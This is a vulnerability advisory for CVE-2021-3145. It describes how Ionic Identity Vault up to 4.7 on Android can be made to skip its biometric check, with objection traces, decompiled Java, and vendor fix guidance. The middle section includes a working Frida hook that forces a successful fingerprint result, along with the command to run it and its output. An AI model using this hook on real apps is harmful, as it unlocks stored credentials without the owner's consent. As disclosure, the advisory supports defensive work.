@@ -1,0 +1,249 @@
+id: 36726
+date: 09/08/2021
+title: Ionic Identity Vault 4.7 Android Biometric Authentication Bypass Vulnerability
+author: Emanuel Duss
+cves: CVE-2021-3145
+
+#############################################################
+#
+# Product:  Identity Vault
+# Vendor:   Ionic
+# CVE ID:   CVE-2021-3145
+# Subject:  Biometric Authentication Bypass on Android
+# Severity: Medium
+# Effect:   Authentication Bypass
+#
+#############################################################
+
+Introduction
+------------
+
+Ionic Identity Vault is a secure storage solution for Android and iOS mobile
+apps which can e.g. be used to store authentication information like access
+tokens [1]. This information can be protected, so that the user has to
+authenticate first, before the information is unlocked.
+
+Identity Vault provides different authentication methods:
+
+- Memory only storage (not persisted at all)
+- Secure storage (without user authentication)
+- Passcode (PIN) authentication
+- Biometric authentication (optionally with device PIN fallback)
+
+During a customer project, we could bypass the biometric authentication
+mechanism of Ionic Identity Vault on Android, because the Android KeyStore
+entry does not require any authentication.
+
+
+Affected
+--------
+
+- Vulnerable: Ionic Identity Vault <= 4.7
+- Not vulnerable: Ionic Identity Vault >= 5
+
+
+Technical Description
+---------------------
+
+# Key Unlock Method
+
+When the user enables biometric authentication, the `automaticallyCreateKey`
+method is called:
+
+    # objection --gadget org.example.app explore \
+      --startup-command 'android hooking watch class "com.ionicframework.auth.IonicKeychainAuthenticatedStorage" \
+      --dump-args --dump-backtrace --dump-return'
+    [CUT BY COMPASS]
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.saveKey(android.content.Context, javax.crypto.SecretKey)
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.automaticallyCreateKey()
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+
+This method creates a new KeyStore entry using the
+`KeyGenParameterSpec.Builder` method:
+
+    @TargetApi(23)
+    private boolean automaticallyCreateKey() {
+        synchronized ("keyLock") {
+            boolean z = false;
+            try {
+                KeyStore.getInstance(EncryptionConstants.ANDROID_KEY_STORE).load(null);
+                KeyGenerator keyGenerator = KeyGenerator.getInstance(this.mAlgorithm, EncryptionConstants.ANDROID_KEY_STORE);
+                keyGenerator.init(new KeyGenParameterSpec.Builder(this.mKeyAlias, 3).setBlockModes(this.mBlockMode).setUserAuthenticationValidityDurationSeconds(this.mAuthDurationSeconds).setEncryptionPaddings(this.mPadding).build());
+                this.mSecretKey = keyGenerator.generateKey();
+                if (this.mSecretKey != null) {
+                    z = true;
+                }
+                return z;
+            } catch (KeyStoreException e) {
+            [CUT BY COMPASS] // more catches
+        }
+    }
+
+The `setUserAuthenticationRequired` method [2] is not used. This means that the
+user does not have to authenticate either via biometric authentication
+(fingerprint) or device PIN.
+
+The KeyStore entry can therefore be used without user authentication and does
+not prompt the user for the fingerprint. Instead, another functionality is used
+to show the biometric authentication prompt to authenticate the user.
+
+
+# Biometric Authentication Prompt
+
+When the user has to provide the fingerprint, the `loadKey` method is called:
+
+    # objection -gadget org.example.app explore \
+      --startup-command 'android hooking watch class "com.ionicframework.auth.IonicKeychainAuthenticatedStorage" \
+      --dump-args --dump-backtrace --dump-return'
+    [CUT BY COMPASS]
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.lock()
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+    (agent) [2122602752446] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+
+Before the `loadKey` method is used to load the key, the method
+`onBiometricActivityResult` is called:
+
+    # objection --gadget org.example.app explore \
+      --startup-command 'android hooking watch class_method "com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey" \
+      --dump-args --dump-backtrace --dump-return'
+    [CUT BY COMPASS]
+    (agent) [5363570796531] Called com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(android.content.Context)
+    (agent) [5363570796531] Backtrace:
+            com.ionicframework.auth.IonicKeychainAuthenticatedStorage.loadKey(Native Method)
+            com.bottlerocketstudios.vault.StandardSharedPreferenceVault.getString(StandardSharedPreferenceVault.java:212)
+            com.ionicframework.auth.IonicCombinedVault.unlock(IonicCombinedVault.java:322)
+            com.ionicframework.auth.IdentityVault.forceUnlock(IdentityVault.java:265)
+            com.ionicframework.auth.IonicNativeAuth.onBiometricActivityResult(IonicNativeAuth.java:482)
+            com.ionicframework.auth.IonicNativeAuth.onActivityResult(IonicNativeAuth.java:472)
+    [CUT BY COMPASS]
+
+This method `onBiometricActivityResult` takes the authentication result as an
+argument. When the `resultCode` is `-1`, authentication is successful and the
+`forceUnlock` method is called. Otherwise, the authentication fails:
+
+    private void onBiometricActivityResult(int resultCode, Intent intent) {
+        IdentityVault identityVault = this.mCurrentVault;
+        identityVault.doTheLifecycles = true;
+        this.mLockedOutOfBiometrics = false;
+        if (resultCode == -1) {
+            try {
+                identityVault.forceUnlock();
+                success(this.mLastCallbackContext);
+            } catch (VaultError e) {
+                error(this.mLastCallbackContext, e);
+            }
+        } else if (intent != null) {
+        [CUT BY COMPASS] // Authentication Failed
+
+
+This can be seen in the backtrace when the authentication is successful:
+
+    # objection --gadget org.example.app explore \
+      --startup-command 'android hooking watch class_method "com.ionicframework.auth.IonicNativeAuth.onBiometricActivityResult" \
+      --dump-args --dump-backtrace --dump-return'
+    (agent) [6161244117830] Called com.ionicframework.auth.IonicNativeAuth.onBiometricActivityResult(int, android.content.Intent)
+    (agent) [6161244117830] Backtrace:
+            com.ionicframework.auth.IonicNativeAuth.onBiometricActivityResult(Native Method)
+            [CUT BY COMPASS]
+    (agent) [6161244117830] Arguments com.ionicframework.auth.IonicNativeAuth.onBiometricActivityResult(-1, "(none)")
+    (agent) [6161244117830] Return Value: "(none)"
+
+Because the KeyStore entry does not require user authentication, this method
+can be hooked in order to bypass biometric authentication.
+
+
+# Biometric Authentication Bypass Hook
+
+The following Frida hook (`frida_hook_fingerprint_bypass.js`) can be used to
+bypass biometric authentication:
+
+    Java.perform(function x() {
+      var myclass = Java.use("com.ionicframework.auth.IonicNativeAuth");
+      myclass.onBiometricActivityResult.implementation = function (a, b) {
+        console.log("[*] Biometric Authentication Bypass Hook");
+        console.log("Class: com.ionicframework.auth.IonicNativeAuth");
+        console.log("  Method: onBiometricActivityResult");
+        console.log("  Parameter: " + a);
+        console.log("Change result from 0 to -1 in order to bypass authentication.");
+        this.onBiometricActivityResult(-1, b); // This calls the method always with -1
+      }
+    });
+
+Executing the Frida hook:
+
+    # frida -U -f org.example.app -l frida_hook_fingerprint_bypass.js --no-pause
+
+When the biometric authentication (fingerprit) dialogue appears, the dialogue
+can be cancelled by clicking somewhere besides the prompt.
+
+The hook is then executed:
+
+    [Pixel 3::org.example.app]->
+    [*] Biometric Authentication Bypass Hook
+    Class: com.ionicframework.auth.IonicNativeAuth
+      Method: onBiometricActivityResult
+      Parameter: 0
+    Change result from 0 to -1 in order to bypass authentication.
+
+The user is logged in without providing a valid fingerprint.
+
+This also works if the Ionic Identity Vault configuration
+`allowSystemPinFallback` is set to `false`.
+
+It has to be noted, that the attacker has to be able to execute code as root on
+the phone to perform this attack.
+
+
+Vulnerability Classification
+----------------------------
+
+CVSS v3.1 Metrics [3]:
+
+- CVSS Base Score: 4.1 (Medium)
+- CVSS Vector: AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N
+
+
+Workaround / Fix
+----------------
+
+# Ionic Identity Vault Library Vendor
+
+Ionic as the vendor of the Identity Vault library has to fix this issue as
+follows.
+
+For the biometric authentication mechanism with device PIN fallback:
+
+- The KeyStore setting `setUserAuthenticationRequired` should be set to `true`
+  in order to enforce authentication (either with biometrics or the device
+  PIN).
+
+For the biometric authentication mechanism without device PIN fallback:
+
+- The KeyStore setting `setUserAuthenticationRequired` should be set to `true`
+  in order to enforce authentication.
+- The KeyStore setting `setUserAuthenticationValidityDurationSeconds ` should
+  be set to `-1` in order to enforce biometric authentication.
+
+On Android >=11, the setting `setUserAuthenticationValidityDurationSeconds` is
+deprecated and `setUserAuthenticationParameters` should be set to `0,1` instead
+to enforce biometric authentication.
+
+See the Android Developer Reference on `KeyGenParameterSpec.Builder` for more
+information [2].
+
+
+# Ionic Identity Vault Library Users
+
+Customers of the Ionic Identity Vault should use the updated version Identity Vault 5.
+
+
+Acknowledgement
+---------------
+
+A very big thank you to my colleague Alex Joss for the support in analyzing
+this vulnerability. This was very interesting and I learned a lot!
+
+#  0day.today [2023-03-25]  #
